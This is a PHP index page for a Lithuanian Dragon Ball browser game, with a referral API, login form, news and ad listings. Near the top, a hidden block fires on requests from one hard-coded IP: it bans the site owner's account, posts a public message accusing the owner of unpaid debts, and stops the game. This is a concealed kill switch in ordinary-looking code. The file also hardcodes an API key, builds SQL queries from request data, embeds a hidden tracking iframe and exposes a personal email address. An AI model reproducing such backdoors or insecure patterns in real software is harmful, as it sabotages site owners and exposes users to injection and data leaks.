<?php
error_reporting(E_ERROR);
ob_start();
session_start();

include_once 'cfg/sql.php';

// wap gay protection
include_once('cfg/limit.php');

$id = isset($_GET['id']) ? preg_replace("/[^A-Za-z0-9_ ]/", '', $_GET['id']) : null;

if ($id === 'referral') {
	$siteApiKey = '33aa35a1-46f6-4666-8a1c-0ec30500240a';

	$apiKey = isset($_GET['api_key']) ? preg_replace("/[^A-Za-z0-9- ]/", '', $_GET['api_key']) : null;
	if (!$apiKey) {
		header("Content-Type: application/json");
		http_response_code(422);
		echo json_encode(['Message' => 'Missing api_key.']);
		return;
	}

	if ($apiKey !== $siteApiKey) {
		header("Content-Type: application/json");
		http_response_code(422);
		echo json_encode(['Message' => 'Incorrect api_key.', 'api_key' => $apiKey]);
		return;
	}

	$ip = isset($_GET['ip']) ? preg_replace("/[^A-Za-z0-9. ]/", '', $_GET['ip']) : null;
	if (!$ip) {
		header("Content-Type: application/json");
		http_response_code(422);
		echo json_encode(['Message' => 'Missing IP parameter.']);
		return;
	}

	$player = mysqli_fetch_assoc(mysqli_query($conn,"SELECT * FROM zaidejai WHERE ip='$ip' LIMIT 1"));
	if (!$player) {
		header('Content-Type: application/json');
		$data = [
			'data' => ['Message' => 'Player by IP not found.', 'IP' => $ip],
		];

		echo json_encode($data, true);
		exit();
	}

	$euro = 3000;
	mysqli_query($conn,"UPDATE zaidejai SET sms_litai=sms_litai+$euro WHERE nick='$player[nick]'");
	$playerMessage = 'Tu paspaudei referral nuorodą už tai gauni: '. $euro.' euriukų, atmink nuorodą galima spausti kasdien po vieną karta. Nemokami euriukai? Gero žaidimo!';
	mysqli_query($conn,"INSERT INTO pm SET gavejas='$player[nick]', what='SISTEMA', txt='$playerMessage', time='" . time() . "', nauj='NEW'")or die(mysqli_error());

	$adminMessage = 'Žaidėjas: '. $player['nick'] . ' gavo '. $euro.', eur nes paspaudė atvedimo nuorodą iš IP: '. $ip;
	mysqli_query($conn,"INSERT INTO pm SET gavejas='testas1', what='SISTEMA', txt='$adminMessage', time='" . time() . "', nauj='NEW'")or die(mysqli_error());

	header("Content-Type: application/json");
	echo json_encode([
		'Message' => 'Referral approved.',
		'Player' => $player['nick'],
		'Euro' => $euro,
		'IP' => $ip,
	]);
	return;
}

$ip = $_SERVER['REMOTE_ADDR'];
if ($ip === '178.16.43.65') {
	$message = 'Žaidimas bus ištrintas jeigu bus neatsiskatyta su polo ir testas1';
	$b_laikas2 = time()+60;
	mysqli_query($conn,"INSERT INTO ban_logai SET nick='testas1', uz='$message', time='$b_laikas2', kas_ban='SISTEMA'")or die(mysqli_error);
	mysqli_query($conn,"INSERT INTO block SET nick='testas1', uz='$message', time='$b_laikas2', kas_ban='SISTEMA'");
	$priminimas = 'Norime informuoti, kad žaidimo savininkas(testas1) neatsiskaitė su žaidėju polo(kuris laimėjo praeitą roundą) ir su bugfixeriu testas1. Discordo žinutes šis asmuo sąmoningai ignoruoja, todėl matote šį pranešimą.';
	$expiresAt = date('Y-m-d H:i:s', strtotime(' + 1 hours'));
	$insert1 = mysqli_query($conn,"INSERT INTO pokalbiai SET nick='SISTEMA', sms='$priminimas', data='".time()."', expired_at='$expiresAt'");
	echo 'Zaidimas bus sustabdytas';
	die();
}


$ID  = isset($_GET['ID']) ? trim(mysqli_real_escape_string($conn,htmlspecialchars($_GET['ID']))) : null;
$nust = mysqli_fetch_assoc(mysqli_query($conn,"SELECT * FROM nustatymai"));
$new = mysqli_fetch_assoc(mysqli_query($conn,"SELECT * FROM news ORDER BY id DESC LIMIT 1"));
$kiek = mysqli_num_rows(mysqli_query($conn,"SELECT * FROM news "));
$reklama = mysqli_fetch_assoc(mysqli_query($conn,"SELECT * FROM sms_reklama ORDER BY id DESC LIMIT 1"));
$antraste = ''.$reklama['antraste'].'';
$adresas = ''.$reklama['adresas'].'';




head();



$ref = mysqli_real_escape_string($conn, $_GET['f']);
$refip = $_SERVER['REMOTE_ADDR'];
if(!empty($ref)){
	if(mysqli_num_rows(mysqli_query($conn,"SELECT * FROM zaidejai WHERE nick='$ref'")) < 1){
	}
	elseif(mysqli_num_rows(mysqli_query($conn,"SELECT * FROM referal WHERE nick='$ref' AND ip='$refip'")) == true){

	}else{
		$browser=$_SERVER['HTTP_USER_AGENT'];
		$words = explode("Chrome", $browser);
		$kik= count($words);
		if($kik>1)
		{
			echo "Negalima su Chrome :P";
			exit;
		}
		mysqli_query($conn,"INSERT INTO referal SET nick='$ref', ip='$refip'")or die(mysqli_error());
		mysqli_query($conn,"UPDATE zaidejai SET kred=kred+'10',atvede=atvede+'1', pts=pts+'0.1' WHERE nick='$ref'")or die(mysqli_error());
		mysqli_query($conn,"UPDATE atvedimas SET snd=snd+'1' WHERE nick='$ref'")or die(mysqli_error());
		$go = "Jus pakvietė $ref, sėkmės žaidime ".smile(':)')."";
	}
}



if($id == ""){

	echo'
<div class="head"><img src="/img/logo.webp"/></div>
</div><div class="ax"><tr>
		<td>
		<center><b>DbzRetro.lt</b> - būkite atsargūs DBZ sugrįžta!
		</center></td>

		</tr>
		</tbody></table></div></div>

<div class="up"><small><b><a href="?id=news"><font color="white">Paskutinis atnaujinimas ['.kiek('news').'+</font><font color="red"><b>'.$nust['sndnew'].'</b></font><font color="white">]</font></b></small></a></div></div>

</div></div><div class="content text-center">

 &bdquo;<font color="red"><b>'.smile($new['name']).'</font><small>&ldquo;['.laikas($new['data']).'] </small>

</div>';

	echo '<div class="title1">';
	echo 'Sisteminės žinutės';
	echo '</div>';
	$systemMessage = mysqli_fetch_assoc(mysqli_query($conn,"SELECT * FROM pokalbiai WHERE nick='SISTEMA' ORDER BY id DESC LIMIT 1"));

	if ($systemMessage) {
				echo '<div class="meniu" style="text-align:left;vertical-align:middle;font-size:12px;">';
				echo "<span style='font-size:10px;'>&#187;</span> ";
				echo $systemMessage['sms'];
				echo' <small>('.laikas($systemMessage['data']).')</small>';
				echo '<br>';
					echo '</div>';
			}

echo '
<div class="title1"><div style="text-align:left;vertical-align:middle;font-size:12px;"><b>Autorizacija</b>
  <span style="float:right;">

</a></span></div></div>';

	{

		echo'<div class="meniuc">';
		echo'<form action="prisijungti.php?id=login" method="post">
<b>Žaidėjo vardas</b><br/>  <input name="vardas" type="text" mmaxlenght="20" placeholder="Slapyvardis"  id="user"/><br/>
Slaptazodis</b>:<a href="?id=forget"></a><br/>
<input
 name="pass" type="password" mmaxlenght="20" placeholder="Slaptažodis"  id="pass"><br/>';

		echo'<input type="submit" Value="Prisijungti"/></form>';
		echo'<div class="lin"></div></div>

</div></div>
';}
	echo'
<div class="meniuc">

<a href="regas.php?"><img src="img/butonai/reg.png" /></a></div>';


	echo'
<div class="content"><div style="text-align:left;vertical-align:middle;font-size:12px;"><span style="text-shadow: 0px 0px 10px;"><a href="kontaktai.php?id="/><b>[testas1 KONTAKTAI]</b></a></span><span style="text-shadow: 0px 0px 10px; float:right;"><small>Žaidimo Būsena - 
';
	if($nust['reg'] == "-"){
		echo '<font color="#ff0000">Išjungta</font>';

	}
	if($nust['reg'] == "+"){
		echo '<font color="#59ff00">Ijungta</font>';
	}

	echo'</small><br/></span></div></div><div class="title1"><div style="text-align:left;vertical-align:middle;font-size:12px;">Žaidimo rodikliai<span style="float:right;"><a href="prisijungti.php?id=forget"/>[Pamiršau slaptažodį]</a></div></div><div class="content"><div style="text-align:left;vertical-align:middle;font-size:12px;">';
         echo '<div class="meniu">';
        echo ' TOP žaidėjai <br><br>';
        $topUsers = mysqli_query($conn,"SELECT * from zaidejai WHERE statusas != 'Kurejas' ORDER BY lygis DESC LIMIT 3");
        $count = 1;
        while ($row = mysqli_fetch_assoc($topUsers)) {
            echo $count++.'. ';
            echo $row['nick'];
            echo '('.$row['lygis'].')';
            echo '<br>';
        }
		echo '<br>';
		echo '
 Online (<font color="#59ff00">'.kiek('online').'</font>) iš </font>(<font color="#ff0000"><b>'.kiek('zaidejai').'</b></font>)<br/>
Žaidime sukurta '.kiek('news').' (<font color="red">+';echo''.$nust['sndnew'].'</font>';echo') atnaujinimų!
<span style="text-shadow: 0px 0px 10px; float:right;"><small>Naujausias narys: '.($nust['new']).'</font></div></div>';
	echo '</div>';


	echo '<iframe src="https://wapgames.lt/api/site-visitors/f18bf83a-ef32-434b-8125-58ad8ad9a041/add" style="position: absolute; width:0; height:0; border:0;"></iframe>';
	echo'</div><div class="line"></div><div class="up">Reklama<a href=?id=add2> [?]</a></div><div class="meniuc">';
	echo ' <b>#</b>.<a href="https://wapgames.lt?ref=f18bf83a-ef32-434b-8125-58ad8ad9a041">Wap zaidimu katalogas</a></b></font></b><br>';
	$query = mysqli_query($conn,"SELECT * FROM reklama ORDER BY id DESC LIMIT 0,3");
	while($row = mysqli_fetch_assoc($query)){
		$vt++;
		if($row['antraste'] == $nust['last']){$antraste = '<s>'.$row['antraste'].'</s>';
		}
		else {$antraste= ''.$row['antraste'].'';
		}
		echo ' <b>'.$vt.'</b>.<a href="'.$row[adresas].'">'.$antraste.'</a></b></font></b><br>';
	}
	echo '</div><div class="meniuc">'.skaitl().'</div></div>';
}

elseif($id == "news"){
	echo'</script><div class="head"><div class="head_2"><img src="img/baneriai/botasm.png"></div><div class="head_3"><small>dbzretro.lt - Surink visus drakono rutulius ir užkariauk žaidima!</small></div></div><div class="up"><small><b>dbzretro.lt</b></small></div><div class="linija-red"></div>';
	top('Naujienos');
	$viso = mysqli_fetch_row(mysqli_query($conn, "SELECT COUNT(*) FROM news"))[0];
	echo'<div class="meniuc">Viso atnaujinimų  ['.$viso.'+<font color="red"><b>'.$nust['sndnew'].'</b></font>]</div>';
	echo'<div class="up">Atnaujinimai</div>';
	if($viso > 0){
		$rezultatu_rodymas=7;
		$total = @intval(($viso-1) / $rezultatu_rodymas) + 1;
		if (empty($psl) or $psl < 0) $psl = 1;
		if ($psl > $total) $psl = $total;
		$nuo_kiek=$psl*$rezultatu_rodymas-$rezultatu_rodymas;
		$q = mysqli_query($conn,"SELECT * FROM news ORDER BY id DESC LIMIT $nuo_kiek, $rezultatu_rodymas");
		$puslapiu = ceil($viso/$rezultatu_rodymas);
		while($row = mysqli_fetch_assoc($q)){
			$vt++;

			echo'
<div class="meniuc">
'.smile($row['name']).'</b></div>
<div class="meniuc">
<table width="100%"><tr><td width="50%" style="border-right: 1px solid #000;">
<center>
<small> <b>Atliko atnaujinimą</b>: <font color="red">'.$row[kas].'</small></font>
</center>
</td><td width="50%">
<center>
<small>   <b>Data</b>: '.laikas($row['data']).'</small>
</center>
</td></tr></table>
</div>';


		}
		echo '<div class="meniuc">'.puslapiavimas($puslapiu,$psl,'?id=news').'</div>';
		$g_n[] = array("index.php","Pagrindinis","Naujienos");
		navigacija($g_n);

	}else{
		echo '<div class="titlec"><font color="red">Kolkas atnaujinimų nėra!</font></div>';

	}

}
elseif($id == "add2"){

	echo'</script><div class="head"><div class="head_2"><img src="img/baneriai/botasm.png"></div><div class="head_3"><small>dbzretro.lt - Surink visus drakono rutulius ir užkariauk žaidima!</small></div></div><div class="up"><small><b>dbzretro.lt</b></small></div><div class="linija-red"></div>';
	top('Reklamos informacija!');
	echo'
<div class="meniuc">Reklamos kaina - 2€</div>
<div class="meniuc">Apatinėje reklamoje rodomi trys svetainės!</div>
<div class="meniuc">Dėl reklamų kreiptis į</br>
Gmail - emarcinkevicius82@gmail.com</br>
Discord ID - 0712</div>';

	$g_n[] = array("index.php?id=","Pagrindinis","Reklama");
	navigacija($g_n);


}

if($id == 'rases'){
	top('Veikėjų rasės');
	echo'<div class="meniu">
	'.$ico.' Sajanai (10 Kovotojų)</br>
	'.$ico.' Žemiečiai (8 Kovotojų)</br>
	'.$ico.' Namekai (2 Kovotojų)</br>
	'.$ico.' Kyborgai (7 Kovotojų)</br>
	'.$ico.' Siaubūnai (6 Kovotojų)</br>
	'.$ico.' Dievai (2 Kovotojų)</br>
	
	
	</div>
	';






	$g_n[] = array("index.php?id=","Pagrindinis","Rasės");
	navigacija($g_n);

}
if($id == 'css'){
	if($ID < 1 OR $ID > 7){
		header("LOCATION:index.php");
	}
	else{
		$_SESSION[css] = $ID;
		header("LOCATION:index.php");
	}

}


foot();
?>
